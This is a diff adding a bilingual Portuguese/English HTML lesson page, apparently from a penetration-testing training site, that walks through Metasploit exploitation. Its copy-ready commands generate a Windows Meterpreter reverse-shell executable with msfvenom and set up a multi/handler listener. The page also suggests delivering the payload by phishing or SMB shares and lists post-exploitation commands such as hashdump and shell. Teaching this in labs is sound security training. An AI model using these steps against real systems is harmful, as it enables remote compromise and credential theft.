@@ -1,0 +1,146 @@
+<!-- TRILHA METASPLOIT — Exploitation -->
+<div class="container-narrow" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
+
+    <div class="flex items-center gap-3" style="margin-bottom: var(--space-3);">
+        <a href="#/home" class="btn btn-ghost btn-sm"><i class="fa-solid fa-arrow-left"></i> <span data-lang-pt>Voltar</span><span data-lang-en>Back</span></a>
+        <span class="badge badge-advanced"><span data-lang-pt>⭐⭐⭐ Avançado</span><span data-lang-en>⭐⭐⭐ Advanced</span></span>
+    </div>
+    <div style="margin-bottom: var(--space-10);">
+        <h1 style="margin-bottom: var(--space-3);"><i class="fa-solid fa-skull" style="color: var(--accent-danger);"></i> <span data-lang-pt>Trilha System Exploitation (Metasploit)</span><span data-lang-en>System Exploitation Trail (Metasploit)</span></h1>
+        <p class="text-muted" style="font-size: var(--fs-md); max-width: 650px;">
+            <span data-lang-pt>O Metasploit Framework é a plataforma de exploração mais utilizada no mundo. Com ele, podemos testar exploits públicos contra sistemas vulneráveis, gerenciar payloads e obter acesso remoto via sessões interativas do Meterpreter.</span>
+            <span data-lang-en>The Metasploit Framework is the world's most widely used exploitation platform. It allows testers to deploy exploits, manage payloads, and gain interactive remote access via Meterpreter sessions.</span>
+        </p>
+        <div style="margin-top: var(--space-4); max-width: 400px;">
+            <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
+                <span class="progress-label text-sm" style="color: var(--accent-danger);">0%</span>
+            </div>
+            <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="metasploit" style="width: 0%; background: var(--accent-danger);"></div></div>
+        </div>
+    </div>
+
+    <!-- Inputs -->
+    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
+        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);"><i class="fa-solid fa-sliders" style="color: var(--accent-danger);"></i> <span data-lang-pt>Configuração da Exploração</span><span data-lang-en>Exploitation Setup</span></h3>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>IP do Alvo (RHOSTS)</span><span data-lang-en>Target IP (RHOSTS)</span></label>
+                <input type="text" id="target" value="192.168.1.100" data-cmd-input>
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Seu IP (LHOST)</span><span data-lang-en>Your IP (LHOST)</span></label>
+                <input type="text" id="lhost" value="10.10.14.5" data-cmd-input>
+                <span class="input-hint"><span data-lang-pt>IP da sua máquina Kali Linux para receber o shell reverso</span><span data-lang-en>Your Kali Linux IP address to receive the reverse shell connection</span></span>
+            </div>
+            <div class="input-group">
+                <label><span data-lang-pt>Porta Local (LPORT)</span><span data-lang-en>Local Port (LPORT)</span></label>
+                <input type="text" id="lport" value="4444" data-cmd-input>
+            </div>
+        </div>
+    </div>
+
+    <!-- FASE 1 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 1</div>
+        <h2><i class="fa-solid fa-file-invoice"></i> <span data-lang-pt>Gerar Payload Reverso (msfvenom)</span><span data-lang-en>Generate Reverse Payload (msfvenom)</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>O <code>msfvenom</code> é a ferramenta usada para gerar payloads em diversos formatos (Windows exe, Linux elf, PHP, ASPX). Geraremos um executável reverso do Meterpreter que se conectará de volta à nossa máquina Kali.</span>
+            <span data-lang-en><code>msfvenom</code> is used to build payloads in multiple formats (Windows exe, Linux elf, PHP, ASPX). We will generate a reverse Meterpreter executable that connects back to our Kali machine.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Criar Executável</span><span data-lang-en>Create Executable</span></div>
+            <div class="command-box">
+                <code data-cmd="msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="1"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Payload gerado com sucesso</span><span data-lang-en>Payload successfully generated</span></span></label>
+    </div>
+
+    <!-- FASE 2 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 2</div>
+        <h2><i class="fa-solid fa-headphones"></i> <span data-lang-pt>Configurar Ouvinte (multi/handler)</span><span data-lang-en>Configure Listener (multi/handler)</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Precisamos abrir uma porta no Kali para aguardar a conexão do payload. Usamos o módulo <code>exploit/multi/handler</code> no console do Metasploit.</span>
+            <span data-lang-en>We need to open a listening port on Kali to wait for the payload connection. We use the <code>exploit/multi/handler</code> module in the Metasploit console.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-terminal"></i> msfconsole</div>
+            <span class="command-label"><span data-lang-pt>1. Iniciar console do Metasploit:</span><span data-lang-en>1. Start Metasploit console:</span></span>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>msfconsole -q</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <span class="command-label"><span data-lang-pt>2. Executar comandos de configuração dentro do console:</span><span data-lang-en>2. Run configuration commands inside the console:</span></span>
+            <div class="command-box">
+                <code data-cmd="use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run">use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="2"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Handler ativado e aguardando conexão</span><span data-lang-en>Handler active and waiting for connection</span></span></label>
+    </div>
+
+    <!-- FASE 3 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 3</div>
+        <h2><i class="fa-solid fa-play"></i> <span data-lang-pt>Execução e Exploração</span><span data-lang-en>Execution & Exploitation</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Transfira o executável gerado (<code>payload.exe</code>) para o ambiente de testes da vítima (via e-mail de phishing, compartilhamento SMB vulnerável, etc.) e execute-o. Assim que rodar, você receberá a sessão do Meterpreter no console da Fase 2.</span>
+            <span data-lang-en>Transfer the generated file (<code>payload.exe</code>) to the target testing machine (via phishing, vulnerable SMB shares, etc.) and run it. As soon as it runs, you will get a Meterpreter session in the Phase 2 console.</span>
+        </p>
+        <div class="action-area">
+            <div class="info-box info-success">
+                <i class="fa-solid fa-circle-check"></i>
+                <span><span data-lang-pt>A mensagem <strong>"Meterpreter session 1 opened"</strong> indica que o sistema foi comprometido com sucesso.</span><span data-lang-en>The message <strong>"Meterpreter session 1 opened"</strong> indicates the host is successfully compromised.</span></span>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="3"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Sessão do Meterpreter estabelecida</span><span data-lang-en>Meterpreter session established</span></span></label>
+    </div>
+
+    <!-- FASE 4 -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: var(--accent-danger);">Fase 4</div>
+        <h2><i class="fa-solid fa-key"></i> <span data-lang-pt>Pós-Exploitação Básica</span><span data-lang-en>Basic Post-Exploitation</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Dentro do prompt do Meterpreter, temos acesso total de baixo nível ao sistema. Podemos obter informações do sistema, extrair hashes locais para quebrar offline ou rodar comandos do shell nativo.</span>
+            <span data-lang-en>Inside the Meterpreter prompt, we have low-level access to the host. We can query system info, dump hashes to crack offline, or drop into a native command shell.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-desktop"></i> <span data-lang-pt>Comandos Úteis do Meterpreter</span><span data-lang-en>Useful Meterpreter Commands</span></div>
+            <span class="command-label"><span data-lang-pt>1. Verificar informações do host:</span><span data-lang-en>1. Query host system info:</span></span>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>sysinfo</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <span class="command-label"><span data-lang-pt>2. Extrair hashes de senha (SAM/AD):</span><span data-lang-en>2. Dump local system password hashes:</span></span>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>hashdump</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <span class="command-label"><span data-lang-pt>3. Entrar no terminal de comandos nativo:</span><span data-lang-en>3. Drop into a system command shell:</span></span>
+            <div class="command-box">
+                <code>shell</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+        </div>
+        <label class="step-check"><input type="checkbox" data-step="4"><span class="checkmark"><i class="fa-solid fa-check"></i></span><span><span data-lang-pt>Pós-exploração executada e shell obtido</span><span data-lang-en>Post-exploitation executed and shell obtained</span></span></label>
+    </div>
+
+    <!-- Completion -->
+    <div class="card-flat reveal" style="text-align: center; padding: var(--space-10);">
+        <i class="fa-solid fa-trophy" style="font-size: 3rem; color: var(--accent-danger); margin-bottom: var(--space-4); display: block;"></i>
+        <h2><span data-lang-pt>Trilha Metasploit Completa!</span><span data-lang-en>Metasploit Trail Complete!</span></h2>
+        <p class="text-muted" style="margin-top: var(--space-2); margin-bottom: var(--space-6);">
+            <span data-lang-pt>Parabéns! Você concluiu a trilha básica de exploração. Aprofunde suas habilidades consultando o Arsenal de ferramentas e a Base de Conhecimento.</span>
+            <span data-lang-en>Congratulations! You have completed the basic exploitation path. Refine your skills using the Arsenal and the Knowledge Base.</span>
+        </p>
+        <div class="flex justify-center gap-4 flex-wrap">
+            <a href="#/arsenal" class="btn btn-primary"><i class="fa-solid fa-toolbox"></i> Arsenal</a>
+            <a href="#/home" class="btn btn-ghost"><i class="fa-solid fa-house"></i> <span data-lang-pt>Início</span><span data-lang-en>Home</span></a>
+        </div>
+    </div>
+</div>
